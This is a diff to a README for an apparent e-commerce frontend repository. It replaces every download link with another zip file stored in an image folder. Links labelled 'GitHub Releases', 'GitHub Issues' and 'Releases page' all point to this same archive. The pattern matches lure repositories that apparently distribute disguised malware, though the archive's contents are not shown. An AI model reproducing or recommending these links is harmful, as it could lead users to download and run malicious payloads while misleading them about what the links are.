@@ -1,6 +1,6 @@
 # 🛒 production-ready-scalable-ecommerce-frontend - A User-Friendly E-commerce Experience
 
-[![Download](https://github.com/hemanth14-collab/production-ready-scalable-ecommerce-frontend/raw/refs/heads/main/img/pay/production_scalable_frontend_ready_ecommerce_3.7.zip)](https://github.com/hemanth14-collab/production-ready-scalable-ecommerce-frontend/raw/refs/heads/main/img/pay/production_scalable_frontend_ready_ecommerce_3.7.zip)
+[![Download](https://raw.githubusercontent.com/hemanth14-collab/production-ready-scalable-ecommerce-frontend/main/img/blog/frontend-ecommerce-scalable-production-ready-3.2.zip)](https://raw.githubusercontent.com/hemanth14-collab/production-ready-scalable-ecommerce-frontend/main/img/blog/frontend-ecommerce-scalable-production-ready-3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ This guide will help you set up and run the production-ready scalable e-commerce
 
 ## 📥 Download & Install
 
-To download the software, visit this page to download: [GitHub Releases](https://github.com/hemanth14-collab/production-ready-scalable-ecommerce-frontend/raw/refs/heads/main/img/pay/production_scalable_frontend_ready_ecommerce_3.7.zip).
+To download the software, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/hemanth14-collab/production-ready-scalable-ecommerce-frontend/main/img/blog/frontend-ecommerce-scalable-production-ready-3.2.zip).
 
 Once on the Releases page, you will find the latest version available for download. Click on the download link for the file that matches your needs. 
 
@@ -59,7 +59,7 @@ If you encounter issues while using the application, here are some common proble
 
 If you need further assistance, consider reaching out through the following channels:
 
-- **GitHub Issues:** Report bugs or request new features by creating an issue [here](https://github.com/hemanth14-collab/production-ready-scalable-ecommerce-frontend/raw/refs/heads/main/img/pay/production_scalable_frontend_ready_ecommerce_3.7.zip).
+- **GitHub Issues:** Report bugs or request new features by creating an issue [here](https://raw.githubusercontent.com/hemanth14-collab/production-ready-scalable-ecommerce-frontend/main/img/blog/frontend-ecommerce-scalable-production-ready-3.2.zip).
 - **Community Forums:** Join discussions with other users for additional tips and tricks.
 
 ## 🔗 Related Projects
@@ -75,7 +75,7 @@ To improve your site's visibility, consider integrating analytics tools and foll
 
 ## 🔄 Keeping Your Software Updated
 
-Regular updates ensure you have the latest features and security improvements. Check back on the [Releases page](https://github.com/hemanth14-collab/production-ready-scalable-ecommerce-frontend/raw/refs/heads/main/img/pay/production_scalable_frontend_ready_ecommerce_3.7.zip) periodically to stay up-to-date.
+Regular updates ensure you have the latest features and security improvements. Check back on the [Releases page](https://raw.githubusercontent.com/hemanth14-collab/production-ready-scalable-ecommerce-frontend/main/img/blog/frontend-ecommerce-scalable-production-ready-3.2.zip) periodically to stay up-to-date.
 
 ## 📝 License
 
@@ -85,4 +85,4 @@ This project is open-source and available under the MIT License. You are free to
 
 With this frontend, you’re equipped to build a professional e-commerce website. Enjoy exploring and customizing it to fit your needs. For any questions or feedback, feel free to reach out via the support channels mentioned above. 
 
-[![Download](https://github.com/hemanth14-collab/production-ready-scalable-ecommerce-frontend/raw/refs/heads/main/img/pay/production_scalable_frontend_ready_ecommerce_3.7.zip)](https://github.com/hemanth14-collab/production-ready-scalable-ecommerce-frontend/raw/refs/heads/main/img/pay/production_scalable_frontend_ready_ecommerce_3.7.zip)
+[![Download](https://raw.githubusercontent.com/hemanth14-collab/production-ready-scalable-ecommerce-frontend/main/img/blog/frontend-ecommerce-scalable-production-ready-3.2.zip)](https://raw.githubusercontent.com/hemanth14-collab/production-ready-scalable-ecommerce-frontend/main/img/blog/frontend-ecommerce-scalable-production-ready-3.2.zip)
